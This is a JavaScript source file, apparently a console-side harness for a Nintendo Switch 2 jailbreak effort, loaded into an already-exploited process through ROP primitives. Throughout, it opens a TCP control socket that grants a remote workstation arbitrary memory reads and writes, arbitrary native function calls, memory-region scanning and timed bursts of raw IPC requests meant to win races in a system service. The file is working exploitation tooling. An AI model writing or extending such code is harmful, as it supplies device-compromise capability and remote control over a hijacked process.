// M2 wave harness, console side.
// Load after core.js with send_js.py, then drive it from harness/host.py on port 9027.
//
// The console side is deliberately transport-only: it relocates SVC wrappers, stages
// request pages, posts synchronous and asynchronous IPC requests, and timestamps with
// the native counter. Every wire format lives workstation-side in harness/host.py, so
// frames can be diffed against ns2jb's captured packets without touching the console.
//
// Payloads are eval'd inside core.js's scope, so malloc, free, call_rop, read_buffer,
// write_buffer, socket/bind/listen/accept/recv/send/close, sleep, text_encode and
// bytes_to_string are already in scope.
(async () => {
    // 9027 can be left bound by a dead payload instance (raw fds are not freed on
    // payload exit), so use a fresh port and bump it if a bind ever fails.
    const CONTROL_PORT = 9029;
    const PAGE = 4096n;
    const RET = 0xD65F03C0;
    const SCAN_SPAN = 0x600000n;
    const POST_POOL = 64;

    // Switch 1 numbering from research/libnx/nx/include/switch/kernel/svc.h.
    // Wrappers are found by scanning for `svc #imm; ret`; a Switch 2 numbered image
    // yields no candidates for these ids, and the report says so instead of guessing.
    const SVC_IDS = {
        queryMemory: 0x06, createThread: 0x08, startThread: 0x09, exitThread: 0x0A,
        sleepThread: 0x0B, getThreadCoreMask: 0x10, setThreadCoreMask: 0x11,
        setThreadCoreMaskAlt: 0x12, clearEvent: 0x12,
        closeHandle: 0x16, waitSynchronization: 0x18, getSystemTick: 0x1E,
        connectToNamedPort: 0x1F, sendSyncRequest: 0x21,
        sendSyncRequestWithUserBuffer: 0x22, sendAsyncRequestWithUserBuffer: 0x23,
        getInfo: 0x29, createEvent: 0x45
    };

    const say = window.log;
    const rd32 = addr => Number(read32(addr)) >>> 0;

    function svcCandidates(id, base = sdk_base, span = SCAN_SPAN) {
        const found = [];
        const pattern = (0xD4000001 | (id << 5)) >>> 0;  // AArch64 SVC: imm16 in bits [20:5]
        for (let off = 0n; off < span; off += 4n) {
            if (rd32(base + off) !== pattern) continue;
            if (rd32(base + off + 4n) !== RET) continue;
            found.push(Number(base + off));
            if (found.length >= 8) break;
        }
        return found;
    }

    const verifyWrapper = (addr, id) =>
        rd32(BigInt(addr)) === (0xD4000000 | id) && rd32(BigInt(addr) + 4n) === RET;

    const dump = (addr, len) => Array.from(read_buffer(BigInt(addr), len))
        .map(b => b.toString(16).padStart(2, "0")).join("");

    const parseHex = text => {
        const out = new Uint8Array(text.length / 2);
        for (let i = 0; i < out.length; i++) out[i] = parseInt(text.substr(i * 2, 2), 16);
        return out;
    };

    // Page-aligned staging: svcSend*RequestWithUserBuffer needs a page-aligned
    // 0x1000 user buffer, so calloc output is rounded up and the raw pointer kept.
    const raws = [];
    const rawByAligned = new Map();
    function pageAddress(pages = 1) {
        const raw = malloc(BigInt(pages) * PAGE + PAGE);
        raws.push(raw);
        const aligned = (raw + PAGE - 1n) & ~0xFFFn;
        // freeAddresses must free the RAW malloc pointer: freeing the aligned interior pointer
        // (which is what the host's wave_allocs recorded) corrupts the game heap between wave
        // attempts. Map aligned -> raw so targeted frees hit the real allocation.
        rawByAligned.set(aligned, raw);
        return aligned;
    }

    function put(addr, bytes) {
        const padded = new Uint8Array(Math.ceil(bytes.length / 4) * 4);
        padded.set(bytes);
        write_buffer(addr, padded);
        return bytes.length;
    }

    // Loaded from the host: decoded syscall stubs (imm -> sdk offset) and relocated
    // SDK library functions (name -> sdk offset). The old scan-for-`svc;ret` approach
    // missed every multi-instruction stub, so the table is authoritative.
    const svcTable = new Map();
    const sdkFunctions = new Map();
    const state = { wrappers: {}, tickFrequency: 0, ready: false };
    let stop = false;

    function call(name, args = []) {
        const addr = state.wrappers[name];
        if (!addr) throw new Error("Wrapper missing: " + name);
        return call_rop(addr, ...Array.from({ length: 6 }, (_, i) => BigInt(args[i] ?? 0)));
    }

    const tick = () => Number(call("getSystemTick"));
    const sleepNs = ns => call("sleepThread", [BigInt(ns)]);

    // Two 200 ms native sleeps bracket a known interval, so the counter frequency is
    // measured instead of assumed; compat images report a legacy frequency.
    function calibrate() {
        const before = tick();
        sleepNs(200000000);
        return (tick() - before) / 0.2;
    }

    function relocate() {
        return Object.fromEntries(Object.entries(SVC_IDS).map(([name, id]) => {
            const candidates = svcCandidates(id);
            return [name, { id, candidates, verified: candidates.some(a => verifyWrapper(a, id)),
                inTable: svcTable.has(id) }];
        }));
    }

    function applyRelocation() {
        state.wrappers = {};
        for (const [name, id] of Object.entries(SVC_IDS)) {
            if (svcTable.has(id)) state.wrappers[name] = sdk_base + BigInt(svcTable.get(id));
        }
        // There is no getSystemTick stub; the SDK tick is `mrs x0, cntvct_el0; ret`.
        if (sdkFunctions.has("tick")) state.wrappers.getSystemTick = sdk_base + BigInt(sdkFunctions.get("tick"));
        state.tickFrequency = state.wrappers.getSystemTick ? calibrate() : 0;
        state.ready = Boolean(state.wrappers.sendSyncRequestWithUserBuffer && state.wrappers.waitSynchronization);
        return {
            applied: Object.entries(state.wrappers).map(([name, addr]) => ({ name, address: Number(addr) })),
            tickFrequency: state.tickFrequency, ready: state.ready
        };
    }

    const scratch = { out: pageAddress(1), name: pageAddress(1), sync: pageAddress(1) };

    // The raw connectToNamedPort SVC is refused in compat mode; the SDK getService
    // rides the SM session the process already holds. Convention (ns2jb app/session.cjs):
    // getService(out, name, nameLen), handle written to the first 4 bytes of `out`.
    function openService(name) {
        const offset = sdkFunctions.get("getService");
        if (offset === undefined) throw new Error("getService is not in the SDK table");
        const values = pageAddress(1), nameAt = values + 8n;
        put(values, new Uint8Array(32));
        put(nameAt, text_encode(name));
        const result = Number(BigInt.asIntN(64, call_rop(sdk_base + BigInt(offset), values, nameAt, BigInt(name.length))));
        return { result, handle: rd32(values) };
    }

    // Each request owns one page: SendSyncRequest overwrites that page with the reply,
    // so concurrent requests must never share a buffer.
    const slots = Array.from({ length: POST_POOL }, () => pageAddress(1));
    const posts = [];

    function sendRaw(handle, packetHex) {
        const bytes = parseHex(packetHex);
        if (bytes.length > 0x1000) throw new Error("Packet exceeds one page");
        put(scratch.sync, bytes);
        const result = Number(BigInt.asIntN(64, call("sendSyncRequestWithUserBuffer", [scratch.sync, 0x1000, handle])));
        return { result, buffer: scratch.sync, hex: dump(scratch.sync, 256) };
    }

    function postRaw(handle, packetHex, label) {
        if (posts.length >= POST_POOL) throw new Error("Post pool exhausted, collect first");
        const buffer = slots[posts.length];
        put(buffer, parseHex(packetHex));
        write64(scratch.out, 0n);
        // libnx: svcSendAsyncRequestWithUserBuffer(Handle* out, Handle session, void* buffer, size_t size)
        const result = Number(BigInt.asIntN(64, call("sendAsyncRequestWithUserBuffer", [scratch.out, handle, buffer, 0x1000])));
        const entry = { label, buffer, handle, result, tick: tick(), event: rd32(scratch.out) };
        posts.push(entry);
        return { result, tick: entry.tick, event: entry.event, index: posts.length - 1 };
    }

    function collect(index, timeoutNs = 1000000000) {
        const entry = posts[index];
        if (!entry) throw new Error("No post at " + index);
        // This SDK's svcWaitSynchronization stub treats x0 as an OUTPUT pointer
        // (its own callers pass a stack address), so the event handle must not go
        // there. Poll instead: sleep, then read the request page, which the FS
        // overwrites with the reply.
        const ms = Math.max(1, Math.min(200, Math.round(timeoutNs / 1000000)));
        sleepNs(BigInt(ms) * 1000000n);
        entry.waitTick = tick();
        entry.hex = dump(entry.buffer, 256);
        call("closeHandle", [entry.event]);
        return { waitTick: entry.waitTick, hex: entry.hex, label: entry.label };
    }

    // ---- wave engine ----
    // Plans are authored workstation-side. Steps run in order; a step is either a
    // synchronous request or an asynchronous post. Posts stay in flight until the
    // engine collects them, so interleaving is controlled by delay plus post order,
    // and the tick stamps give the receive-order margins ns2jb gates on.
    async function runWave(plan) {
        posts.length = 0;
        const report = { label: plan.label, steps: [], gates: plan.gates || {} };
        for (const [index, step] of plan.steps.entries()) {
            if (step.delayNs) sleepNs(step.delayNs);
            const handle = step.handle ?? plan.handle;
            if (step.kind === "sync") {
                const reply = sendRaw(handle, step.packet);
                report.steps.push({ index, role: step.role, kind: "sync", result: reply.result, hex: reply.hex });
                continue;
            }
            const posted = postRaw(handle, step.packet, step.role || "post" + index);
            report.steps.push({ index, role: step.role, kind: "post", result: posted.result, tick: posted.tick, event: posted.event });
            if (step.flushAfter) {
                const flush = plan.steps.filter(s => s.kind !== "sync").map(s => s.index);
                for (const i of flush) if (posts[i] && posts[i].waitTick === undefined) report.steps[i] = { ...report.steps[i], ...collect(i, plan.timeoutNs ?? 1000000000) };
            }
        }

        const flight = report.steps.filter(step => step.kind === "post");
        for (const step of flight) {
            if (step.waitTick === undefined) Object.assign(step, collect(step.index, plan.timeoutNs ?? 1000000000));
        }

        const frequency = state.tickFrequency || 19200000;
        const posted = flight.map(step => step.tick).sort((a, b) => a - b);
        const waited = flight.map(step => step.waitTick).sort((a, b) => a - b);
        report.postOrder = flight.map(step => step.role);
        report.spacingMicroseconds = posted.slice(1).map((v, i) => (v - posted[i]) / frequency * 1e6);
        report.waitSpacingMicroseconds = waited.slice(1).map((v, i) => (v - waited[i]) / frequency * 1e6);

        const gates = plan.gates || {};
        report.verdict = {};
        if (gates.minSpacingMicroseconds) {
            report.verdict.spacing = report.spacingMicroseconds.length === 0 ||
                Math.min(...report.spacingMicroseconds) >= gates.minSpacingMicroseconds;
        }
        if (gates.results) {
            report.verdict.results = flight.map(step => ({ role: step.role, result: step.result }));
            report.verdict.resultsOk = report.verdict.results.every(row => row.result === 0);
        }
        return report;
    }

    // ---- control transport ----
    function openListener(port) {
        const addr = malloc(16), len = malloc(8), on = malloc(4);
        write_buffer(addr, new Uint8Array(16));
        write32(on, 1);
        const fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd === -1n) throw new Error("Control socket failed");
        setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, on, 4);
        write8(addr, 16n);
        write8(addr + 1n, 2n);
        write16(addr + 2n, BigInt(((port & 0xff) << 8) | (port >> 8)));
        write32(addr + 4n, 0n);
        if (bind(fd, addr, 16) === -1n) throw new Error("Control bind failed on " + port);
        if (listen(fd, 2) === -1n) throw new Error("Control listen failed on " + port);
        return fd;
    }

    const io = { head: pageAddress(1), out: pageAddress(16), in: pageAddress(16) };

    function readFrame(fd) {
        const head = new Uint8Array(4);
        let got = 0;
        while (got < 4) {
            const n = Number(recv(fd, io.in + BigInt(got), 4 - got, 0));
            if (n <= 0) return null;
            head.set(read_buffer(io.in + BigInt(got), n), got);
            got += n;
        }
        const size = head[0] | head[1] << 8 | head[2] << 16 | head[3] << 24;
        if (size <= 0 || size > 0x8000) throw new Error("Bad frame size " + size);
        let total = 0;
        while (total < size) {
            const n = Number(recv(fd, io.in + BigInt(total), size - total, 0));
            if (n <= 0) return null;
            total += n;
        }
        return JSON.parse(bytes_to_string(read_buffer(io.in, size)));
    }

    function writeFrame(fd, value) {
        const bytes = text_encode(JSON.stringify(value, (_, v) => typeof v === "bigint" ? v.toString() : v));
        const head = new Uint8Array(4);
        head[0] = bytes.length & 255;
        head[1] = (bytes.length >> 8) & 255;
        head[2] = (bytes.length >> 16) & 255;
        head[3] = (bytes.length >> 24) & 255;
        write_buffer(io.head, head);
        if (Number(send(fd, io.head, 4, 0)) !== 4) throw new Error("Control frame header truncated");
        let sent = 0;
        while (sent < bytes.length) {
            const chunk = bytes.subarray(sent, sent + 0x4000);
            write_buffer(io.out, chunk);
            const n = Number(send(fd, io.out, chunk.length, 0));
            if (n <= 0) throw new Error("Control frame body truncated");
            sent += n;
        }
    }

    async function serve(fd) {
        await say("harness control ready on " + CONTROL_PORT);
        for (;;) {
            const request = readFrame(fd);
            if (!request) break;
            let reply;
            try {
                reply = handle(request);
            } catch (error) {
                reply = { ok: false, error: String(error?.message ?? error), stack: String(error?.stack ?? "") };
            }
            writeFrame(fd, { id: request.id, ...reply });
            if (stop) break;
        }
        close(fd);
        await say("harness control closed");
    }

    function handle(request) {
        switch (request.command) {
            case "status":
                return { ok: state.ready, mainBase: Number(main_base), sdkBase: Number(sdk_base),
                    tickFrequency: state.tickFrequency, poolPages: POST_POOL };
            case "exit":
                stop = true;
                return { ok: true, stopping: true };
            case "setSvcTable": {
                svcTable.clear();
                for (const entry of request.entries || []) svcTable.set(entry.imm, entry.entryOffset);
                return { ok: true, entries: svcTable.size };
            }
            case "setFunctions": {
                sdkFunctions.clear();
                for (const entry of request.entries || []) sdkFunctions.set(entry.name, entry.sdkOffset);
                return { ok: true, entries: sdkFunctions.size };
            }
            case "relocate": {
                const candidates = svcTable.size ? {} : relocate();
                return { candidates, ...applyRelocation() };
            }
            case "call": {
                const args = Array.from({ length: 6 }, (_, i) => BigInt(request.args?.[i] ?? 0));
                const result = BigInt.asIntN(64, call_rop(BigInt(request.address), ...args));
                return { ok: true, address: Number(request.address), result: result.toString(),
                    resultHex: "0x" + BigInt.asUintN(64, result).toString(16) };
            }
            case "regions": {
                const qAddr = state.wrappers.queryMemory;
                if (!qAddr) throw new Error("queryMemory wrapper missing (send tables first)");
                const out = pageAddress(1), page = pageAddress(1);
                const regions = [];
                let at = 0n;
                for (let guard = 0; guard < 512 && at < (1n << 39n); guard++) {
                    write64(out, 0n); write64(out + 8n, 0n); write64(out + 16n, 0n); write64(out + 24n, 0n);
                    write32(page, 0);
                    if (BigInt.asIntN(64, call_rop(qAddr, out, page, at)) !== 0n) break;
                    const base = read64(out), size = read64(out + 8n);
                    if (size === 0n) break;
                    regions.push({ base: Number(base), size: Number(size),
                        type: rd32(out + 16n), attr: rd32(out + 20n), perm: rd32(out + 24n) });
                    at = base + size;
                }
                return { ok: true, regions };
            }
            case "scanRegions": {
                // 8-byte reads must keep slack from the region end or they fault.
                const SLACK = 8;
                const names = (request.names || []).map(text_encode).filter(n => n.length >= 4);
                const window = Number(request.window ?? 0x60);
                const byFirst = new Map();
                for (const nm of names) {
                    const w = (nm[0] | nm[1] << 8 | nm[2] << 16 | nm[3] << 24) >>> 0;
                    const hex = Array.from(nm).map(b => b.toString(16).padStart(2, "0")).join("");
                    if (!byFirst.has(w)) byFirst.set(w, []);
                    byFirst.get(w).push({ nm, hex });
                }
                const results = [];
                for (const reg of request.regions || []) {
                    const base = BigInt(reg.base), size = Number(reg.size);
                    const limit = size - Math.max(...names.map(n => n.length)) - SLACK;
                    const hits = [];
                    for (let off = 0; off < limit && hits.length < 32; off += 4) {
                        const list = byFirst.get(rd32(base + BigInt(off)));
                        if (!list) continue;
                        for (const item of list) {
                            if (dump(base + BigInt(off), item.nm.length) === item.hex) {
                                hits.push({ offset: off,
                                    hex: dump(base + BigInt(off), Math.min(window, size - off - SLACK)) });
                            }
                        }
                    }
                    if (hits.length) results.push({ base: Number(base), size, hits });
                }
                return { ok: true, results };
            }
            case "svc":
                return { result: Number(BigInt.asIntN(64, call(request.name, request.args ?? []))) };
            case "tick":
                return { tick: tick(), tickFrequency: state.tickFrequency };
            case "open":
                return openService(request.name);
            case "alloc":
                return { address: Number(pageAddress(request.pages ?? 1)) };
            case "send":
                return sendRaw(request.handle, request.packet);
            case "post":
                return postRaw(request.handle, request.packet, request.label);
            case "collect":
                return collect(request.index, request.timeoutNs ?? 1000000000);
            case "clearPosts":
                posts.length = 0;
                return { cleared: true };
            case "wave":
                return runWave(request.plan);
            case "read":
                return { hex: dump(request.address, request.length) };
            case "write":
                return { written: put(BigInt(request.address), parseHex(request.hex)) };
            case "query": {
                write64(io.out, 0n);
                write32(io.out + 8n, 0);
                const result = Number(BigInt.asIntN(64, call("queryMemory", [io.out, io.out + 8n, request.address])));
                return { result, address: Number(read64(io.out)), size: Number(read64(io.out + 8n)), permissions: rd32(io.out + 16n) };
            }
            case "info": {
                write64(io.out, 0n);
                const result = Number(BigInt.asIntN(64, call("getInfo", [io.out, request.type, request.handle ?? 0, request.argument ?? 0])));
                return { result, value: Number(read64(io.out)) };
            }
            case "freeAll":
                for (const raw of raws.splice(0)) call_rop(F_free, raw);
                return { released: true };
            case "freeAddresses": {
                // Targeted release of one wave attempt's allocations. Each wave leaks ~100 pages
                // of the game heap (13 frame bases, 13 out pages, 13 request pages, ctrl and the
                // buffers) and nothing frees it; the leak shifts the allocator geometry between
                // attempts, which is visible in the reservation cost drifting 12160 -> 12176 and
                // is the likely cause of the payload dying on attempts 2-3.
                const freed = [], skipped = [];
                for (const address of request.addresses || []) {
                    const raw = rawByAligned.get(Number(address));
                    if (raw === undefined) {
                        // No raw known for this aligned address (already freed, or not from
                        // pageAddress): freeing a guessed pointer would corrupt the heap.
                        skipped.push(Number(address));
                        continue;
                    }
                    rawByAligned.delete(Number(address));
                    call_rop(F_free, raw);
                    freed.push(Number(address));
                }
                return { freed, skipped };
            }
            default:
                throw new Error("Unknown command " + request.command);
        }
    }

    // Do not scan at load time: the host pushes the decoded tables, and scanning
    // 0x600000 per SVC id here would make the load appear to hang.
    applyRelocation();
    await say("harness: " + Object.keys(state.wrappers).length +
        " wrappers from the pushed table, tick " + Math.round(state.tickFrequency) + " Hz");

    const control = openListener(CONTROL_PORT);
    // Allocate the accept out-parameters ONCE. Allocating per iteration means that a single
    // failed allocation makes every later accept fail, so the listener keeps the TCP backlog
    // healthy (connect succeeds) while no client is ever served -- which is exactly the
    // "connect OK, no reply" hang seen after the first connection.
    const acceptAddr = malloc(16), acceptLen = malloc(8);
    for (;;) {
        if (stop) { close(control); break; }
        // Never let an exception escape the loop: the payload would exit and leak
        // the bound control socket, and a later reload would fail to bind.
        let client;
        try {
            client = accept(control, acceptAddr, acceptLen);
        } catch (error) {
            await say("accept error: " + error.message);
            await sleep(200);
            continue;
        }
        if (client === -1n) { await say("accept returned -1"); await sleep(200); continue; }
        await say("harness client connected");
        try {
            await serve(client);
        } catch (error) {
            await say("serve error: " + String(error && error.message || error));
        }
    }
})()
;
